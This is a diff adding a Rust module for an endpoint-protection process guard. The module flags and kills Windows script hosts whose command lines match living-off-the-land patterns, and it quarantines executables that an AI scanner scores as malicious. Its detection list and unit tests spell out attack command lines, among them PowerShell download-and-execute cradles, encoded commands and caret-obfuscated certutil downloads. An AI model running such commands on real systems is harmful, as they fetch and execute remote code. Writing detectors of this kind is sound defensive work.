@@ -1,0 +1,332 @@
+use crate::bin_ai::{self, BinaryAiScanner};
+use crate::config::AppConfig;
+use crate::logger;
+use crate::platform;
+use crate::quarantine::{self, Severity, ThreatEvent};
+use std::collections::HashMap;
+use std::ffi::OsStr;
+use std::fs;
+use std::panic::{self, AssertUnwindSafe};
+use std::path::{Path, PathBuf};
+use std::sync::atomic::{AtomicBool, Ordering};
+use std::sync::Arc;
+use std::thread;
+use std::time::Duration;
+use sysinfo::{Pid, Process, ProcessRefreshKind, ProcessesToUpdate, System, UpdateKind};
+
+const POLL_INTERVAL: Duration = Duration::from_millis(400);
+const EXIT_WAIT_ROUNDS: u32 = 15;
+const EXIT_WAIT_STEP: Duration = Duration::from_millis(200);
+const MAX_TRUST_CACHE: usize = 8192;
+const CMDLINE_LOG_LIMIT: usize = 512;
+
+pub const LOTL_PROCESSES: &[&str] = &[
+    "powershell.exe",
+    "pwsh.exe",
+    "cmd.exe",
+    "wscript.exe",
+    "cscript.exe",
+    "mshta.exe",
+    "certutil.exe",
+];
+
+pub const LOTL_PATTERNS: &[&str] = &[
+    "-enc ",
+    "-ec ",
+    "-encodedcommand",
+    "invoke-expression",
+    "iex ",
+    "iex(",
+    "downloadstring",
+    "frombase64string",
+    "-w hidden",
+    "-windowstyle hidden",
+    "-ep bypass",
+    "certutil -urlcache",
+];
+
+/// Returns the first suspicious pattern for a script host, matching case- and
+/// whitespace-insensitively with quote/caret obfuscation stripped.
+pub fn match_lotl(process_name: &str, cmdline: &str) -> Option<&'static str> {
+    let name = process_name.to_ascii_lowercase();
+    if !LOTL_PROCESSES.contains(&name.as_str()) {
+        return None;
+    }
+    let stripped: String = cmdline.chars().filter(|c| *c != '"' && *c != '^').collect();
+    let mut normalized = stripped
+        .split_whitespace()
+        .collect::<Vec<_>>()
+        .join(" ")
+        .to_lowercase()
+        .replace("certutil.exe ", "certutil ");
+    normalized.push(' ');
+    LOTL_PATTERNS
+        .iter()
+        .copied()
+        .find(|pattern| normalized.contains(pattern))
+}
+
+fn refresh_kind() -> ProcessRefreshKind {
+    ProcessRefreshKind::nothing()
+        .with_cmd(UpdateKind::OnlyIfNotSet)
+        .with_exe(UpdateKind::OnlyIfNotSet)
+        .with_disk_usage()
+}
+
+fn process_name(process: &Process) -> String {
+    OsStr::new(process.name()).to_string_lossy().into_owned()
+}
+
+fn command_line(process: &Process) -> String {
+    process
+        .cmd()
+        .iter()
+        .map(|arg| OsStr::new(arg).to_string_lossy().into_owned())
+        .collect::<Vec<_>>()
+        .join(" ")
+}
+
+pub struct ProcessGuard {
+    cfg: Arc<AppConfig>,
+    scanner: Arc<BinaryAiScanner>,
+    sys: System,
+    /// pid -> start time, so a recycled PID is treated as a new process.
+    seen: HashMap<Pid, u64>,
+    trust_cache: HashMap<PathBuf, (u64, bool)>,
+}
+
+impl ProcessGuard {
+    pub fn new(cfg: Arc<AppConfig>, scanner: Arc<BinaryAiScanner>) -> Self {
+        Self {
+            cfg,
+            scanner,
+            sys: System::new(),
+            seen: HashMap::new(),
+            trust_cache: HashMap::new(),
+        }
+    }
+
+    pub fn poll(&mut self) {
+        self.sys
+            .refresh_processes_specifics(ProcessesToUpdate::All, true, refresh_kind());
+        let mut fresh = Vec::new();
+        for (pid, process) in self.sys.processes() {
+            let started = process.start_time();
+            if self.seen.get(pid) != Some(&started) {
+                self.seen.insert(*pid, started);
+                fresh.push(*pid);
+            }
+        }
+        let live = self.sys.processes();
+        self.seen.retain(|pid, _| live.contains_key(pid));
+        for pid in fresh {
+            self.inspect(pid);
+        }
+    }
+
+    fn inspect(&mut self, pid: Pid) {
+        let Some(process) = self.sys.process(pid) else {
+            return;
+        };
+        let name = process_name(process);
+        if platform::is_protected_process(pid.as_u32(), &name) {
+            return;
+        }
+        let cmdline = command_line(process);
+        let exe = process.exe().map(Path::to_path_buf);
+        if let Some(pattern) = match_lotl(&name, &cmdline) {
+            self.respond_lotl(pid, &name, &cmdline, pattern);
+            return;
+        }
+        if let Some(exe) = exe {
+            self.scan_executable(pid, &name, &exe);
+        }
+    }
+
+    fn respond_lotl(&mut self, pid: Pid, name: &str, cmdline: &str, pattern: &str) {
+        let action = if self.cfg.dry_run {
+            "DRY_RUN: would terminate process".to_string()
+        } else if self.sys.process(pid).is_some_and(|p| p.kill()) {
+            "TERMINATED".to_string()
+        } else {
+            "TERMINATE_FAILED".to_string()
+        };
+        quarantine::record_event(
+            &self.cfg,
+            ThreatEvent::new(
+                "LOTL_SCRIPT",
+                Severity::High,
+                format!("{name} (pid {})", pid.as_u32()),
+                action,
+                format!(
+                    "pattern=\"{}\" cmdline=\"{}\"",
+                    pattern.trim(),
+                    quarantine::truncate_chars(cmdline, CMDLINE_LOG_LIMIT)
+                ),
+            ),
+        );
+    }
+
+    fn is_trusted(&mut self, exe: &Path) -> bool {
+        let mtime = fs::metadata(exe)
+            .map(|m| bin_ai::modified_secs(&m))
+            .unwrap_or(0);
+        if let Some(&(cached_mtime, trusted)) = self.trust_cache.get(exe) {
+            if cached_mtime == mtime {
+                return trusted;
+            }
+        }
+        let trusted = platform::is_trusted_binary(exe);
+        if self.trust_cache.len() >= MAX_TRUST_CACHE {
+            self.trust_cache.clear();
+        }
+        self.trust_cache.insert(exe.to_path_buf(), (mtime, trusted));
+        trusted
+    }
+
+    fn scan_executable(&mut self, pid: Pid, name: &str, exe: &Path) {
+        if !exe.is_file() || self.is_trusted(exe) {
+            return;
+        }
+        let Some(score) = self.scanner.scan_file(exe) else {
+            return;
+        };
+        if score < self.cfg.ai_threshold {
+            return;
+        }
+        let details = format!(
+            "pid={} name={name} score={score:.3} threshold={:.2} engine={}",
+            pid.as_u32(),
+            self.cfg.ai_threshold,
+            self.scanner.engine_name()
+        );
+        let action = if self.cfg.dry_run {
+            "DRY_RUN: would terminate process and quarantine executable".to_string()
+        } else {
+            let killed = self.kill_all_with_exe(exe);
+            self.wait_for_exit(&killed);
+            let quarantined =
+                match quarantine::quarantine_file(exe, &self.cfg, "MALWARE_AI_PROCESS", &details) {
+                    Ok(meta) => format!("QUARANTINED id={}", meta.id),
+                    Err(e) => format!("QUARANTINE_FAILED: {e}"),
+                };
+            format!("TERMINATED {} process(es); {quarantined}", killed.len())
+        };
+        quarantine::record_event(
+            &self.cfg,
+            ThreatEvent::new(
+                "MALWARE_AI_PROCESS",
+                Severity::Critical,
+                exe.display().to_string(),
+                action,
+                details,
+            ),
+        );
+    }
+
+    fn kill_all_with_exe(&self, exe: &Path) -> Vec<Pid> {
+        let target = platform::path_key(exe);
+        let mut killed = Vec::new();
+        for (pid, process) in self.sys.processes() {
+            let same_image = process
+                .exe()
+                .is_some_and(|candidate| platform::path_key(candidate) == target);
+            if same_image
+                && !platform::is_protected_process(pid.as_u32(), &process_name(process))
+                && process.kill()
+            {
+                killed.push(*pid);
+            }
+        }
+        killed
+    }
+
+    fn wait_for_exit(&mut self, pids: &[Pid]) {
+        if pids.is_empty() {
+            return;
+        }
+        for _ in 0..EXIT_WAIT_ROUNDS {
+            self.sys
+                .refresh_processes(ProcessesToUpdate::Some(pids), true);
+            if pids.iter().all(|pid| self.sys.process(*pid).is_none()) {
+                return;
+            }
+            thread::sleep(EXIT_WAIT_STEP);
+        }
+    }
+}
+
+pub fn run(cfg: Arc<AppConfig>, scanner: Arc<BinaryAiScanner>, shutdown: Arc<AtomicBool>) {
+    let mut guard = ProcessGuard::new(cfg, scanner);
+    logger::info("process guard active");
+    while !shutdown.load(Ordering::SeqCst) {
+        if panic::catch_unwind(AssertUnwindSafe(|| guard.poll())).is_err() {
+            logger::error("process guard recovered from a panic");
+        }
+        thread::sleep(POLL_INTERVAL);
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn flags_encoded_and_download_cradles() {
+        assert_eq!(
+            match_lotl("powershell.exe", "powershell.exe -NoP -Enc SQBFAFgA"),
+            Some("-enc ")
+        );
+        assert_eq!(
+            match_lotl("PowerShell.EXE", "powershell -EncodedCommand ZQBjAGgAbwA="),
+            Some("-encodedcommand")
+        );
+        assert!(match_lotl(
+            "pwsh.exe",
+            "pwsh -c \"IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')\""
+        )
+        .is_some());
+        assert!(match_lotl("powershell.exe", "powershell -W Hidden -File x.ps1").is_some());
+        assert!(match_lotl("powershell.exe", "powershell -ep   bypass -f a.ps1").is_some());
+        assert!(match_lotl(
+            "powershell.exe",
+            "powershell [Convert]::FromBase64String($s)"
+        )
+        .is_some());
+        assert!(match_lotl("powershell.exe", "powershell -c iex").is_some());
+    }
+
+    #[test]
+    fn flags_cmd_and_certutil_variants() {
+        assert_eq!(
+            match_lotl(
+                "cmd.exe",
+                "cmd /c c^e^r^t^u^t^i^l -urlcache -split -f http://x/a.exe"
+            ),
+            Some("certutil -urlcache")
+        );
+        assert_eq!(
+            match_lotl(
+                "certutil.exe",
+                "\"C:\\Windows\\System32\\certutil.exe\" -urlcache -f http://x/p a.exe"
+            ),
+            Some("certutil -urlcache")
+        );
+        assert!(match_lotl("mshta.exe", "mshta vbscript:Execute(\"x\") -w hidden").is_some());
+    }
+
+    #[test]
+    fn ignores_benign_commands_and_other_processes() {
+        assert_eq!(
+            match_lotl("powershell.exe", "powershell -NoProfile -File build.ps1"),
+            None
+        );
+        assert_eq!(match_lotl("cmd.exe", "cmd /c npm run build"), None);
+        assert_eq!(
+            match_lotl("powershell.exe", "powershell Get-ChildItem -Recurse"),
+            None
+        );
+        assert_eq!(match_lotl("notepad.exe", "notepad -enc x"), None);
+        assert_eq!(match_lotl("code.exe", "code --windowstyle hidden"), None);
+    }
+}
